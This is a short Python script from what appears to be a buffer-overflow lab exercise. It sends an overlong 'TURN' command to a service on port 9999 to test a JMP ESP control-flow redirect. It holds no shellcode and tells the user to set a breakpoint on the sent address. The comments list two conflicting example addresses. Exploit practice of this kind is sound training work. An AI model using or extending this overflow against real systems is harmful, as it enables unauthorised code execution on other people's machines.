#!/usr/bin/env python3
import socket

IP = "192.168.0.14"
PORT = 9999
PREFIX = b"TURN /.:/"

# REPLACE THIS ADDRESS: Put your own found JMP ESP memory address here in Little Endian format
# Example address used here: 0x625011af 0x311712F3
jmp_esp = b"\xF3\x12\x17\x31" 

payload = PREFIX + (b"A" * 515) + jmp_esp

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((IP, PORT))
        print("[*] Testing JMP ESP pointer redirect path...")
        s.send(payload)
        print("[+] Pointer sent. Set a breakpoint on it to check.")
except socket.error:
    print("[-] Target offline.")

